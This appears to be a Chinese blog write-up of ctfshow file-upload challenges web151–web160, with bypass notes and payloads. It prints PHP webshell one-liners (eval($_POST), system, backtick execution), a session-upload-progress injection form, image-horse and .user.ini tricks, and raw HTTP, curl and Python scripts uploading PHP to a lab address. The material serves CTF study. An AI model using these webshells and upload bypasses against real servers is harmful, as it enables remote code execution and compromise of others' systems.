---
title: "CTF 文件上传漏洞总结：绕过思路与 Payload 构造（ctfshow）"
slug: ctf-file-upload-bypass-and-payloads
cover: ""
date: 2026-01-08
categories:
  - Web安全
  - 文件安全
  - top10
tags:
  - 文件上传漏洞
  - ctfshow
  - 上传绕过
  - multipart/form-data
  - Web漏洞
  - Payload
halo:
  site: http://www.hzhsec.top
  name: 027826b5-9f7e-4fbd-abd9-1017026c4af3
  publish: true
---

<!--more-->



## 概要

本文总结了我做ctfshow有关文件上传的漏洞题目,以及文件上传构造数据包的pyload

------

## ctf.show — web151 ~ web160 条目整理（要点摘录）

> 下面每一项对应你给的编号（web151..web160），按“题目要点 / 绕过手法 / 常见 payload”格式列出，方便快速查阅。

### web151

**要点**：前端 JS 校验绕过。
 **绕过思路**：直接跳过浏览器界面，使用 Burp / curl / Python 直接构造 `multipart/form-data` 请求上传文件（不触发前端校验逻辑）。

```
// 举例（思路）
// 在浏览器中被阻止上传，但用 curl 直接发送上传表单即可绕过 JS 校验。
```

------

### web152

**要点**：MIME 类型判断绕过。
 **绕过思路**：修改上传文件的 `Content-Type` 为允许的 MIME（如 `image/png`）但实际内容为 PHP；或使用 `php://filter`、二次编码等后端绕过方式。

```
Content-Type: image/png  // 可伪造
```

------

### web153

**要点**：同级目录已有 PHP 文件，可借助 `.user.ini` 绕过（或利用上传目录的解析/配置）。
 **绕过思路**：上传特殊文件并配合 `.user.ini`（或其它配置）使上传文件能被作为 PHP 执行。

------

### web154 - web155

**要点**：内容过滤（有对 PHP 关键字或标签的过滤），但存在大小写或其它替代写法绕过。
 **绕过示例**：

```
<?=eval($_POST[a])?>    // 常见短标签 / eval 绕过形式（视题目过滤而定）
```

------

### web156

**要点**：对 `php` 与方括号 `[]` 的过滤。
 **绕过思路**：用其他符号替代 `[]`，或利用不同编码形式、伪协议等使过滤失效。
 示例：用 `{}` 或其它字符尝试构造有效 payload（依题目过滤规则而定）。

------

### web157 - web158

**要点**：题目把马基本锁死，但仍可任意执行 PHP 代码（即存在执行但难写入常见 webshell）。

```
<? system('tac fla*') ?>
```

------

### web159

**要点**：过滤 `()` `[]` `{}` `;` `php` 等字符，但反引号执行（``）或短标签可被利用执行命令。
 **示例 payload**：

```
<?=`tac fla*`?>
```

------

### web160

**要点**：过滤大量字符并检测文件头（magic bytes）；题目常要求绕过头部检测、日志包含、或借助 `.user.ini`。
 **典型技巧**：

- 修改文件头保持 magic bytes（例如 `GIF89a`）同时把 payload 嵌入图片中（或利用 `.user.ini` 设置 `auto_prepend_file`）。
- 使用 `"."` 拼接字符串来分割路径（例如包含日志 `/var/log/nginx/access.log` 分段拼接）。

**示例 HTML 表单（CTF 利用场景）**：

```
<!DOCTYPE html>
<html>
<body>
<form action="http://<challenge-url>/" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system('tac ../f*')");?>" />
  <input type="file" name="file" />
  <input type="submit" value="submit" />
</form>
</body>
</html>
```

------

## multipart/form-data 简要说明（关键点）

- `multipart/form-data` 是浏览器上传文件时使用的媒体类型。数据体由多个部分（part）组成，每个 part 以 boundary 分隔。
- 每个 part 有 `Content-Disposition`（含 `name`、可选 `filename`）和可选 `Content-Type`。
- 后端解析时应严格校验 `filename`、`Content-Type`、真实文件内容（magic bytes）和文件扩展名。

------

## 构造上传 Payload（Raw HTTP 示例）

<img src="/static/屏幕截图 2024-12-11 203230.png">

```
POST /Pass-01/index.php HTTP/1.1
Host: 172.250.250.14
Content-Type: multipart/form-data; boundary=----15638190551882
Content-Length: 318

-----------------------------15638190551882
Content-Disposition: form-data; name="upload_file"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

-----------------------------15638190551882
Content-Disposition: form-data; name="submit"

上传
-----------------------------15638190551882--
```

------

## 常用的上传方式

### 1) curl

```
curl -v -F "upload_file=@phpinfo.php;type=application/octet-stream" \
     -F "submit=上传" \
     http://172.250.250.14/Pass-01/index.php
```

`phpinfo.php` 文件内容：

```
<?php phpinfo();?>
```

### 2) Python脚本

```
import requests

url = "http://172.250.250.14/Pass-01/index.php"
files = {
    'upload_file': ('phpinfo.php', b"<?php phpinfo();?>", 'application/octet-stream')
}
data = {'submit': '上传'}

r = requests.post(url, files=files, data=data)
print(r.status_code)
print(r.text[:1000])
```

### 3) 使用 Burp / Netcat

- 把上面的 Raw HTTP 到 Burp Repeater 或用 `nc` 直接发（注意 `Content-Length` 要正确，建议用 Burp 或 curl 自动计算）。

------

## 快速 Payload 模板（通用）

- **直接上传 PHP**（若允许）：
  - 文件名：`phpinfo.php`
  - 内容：`<?php phpinfo();?>`
- **图片马（当允许 GIF/PNG 头）**：
  - 以 `GIF89a` 开头，后面拼接 PHP 代码或 `<?php ... ?>`，并配合 `.user.ini` 或 `auto_prepend_file` 等设置。
- **伪协议利用**：
  - `php://input`、`php://filter`、`data://`、`phar://`、`zip://` 等，依据题目环境选择使用。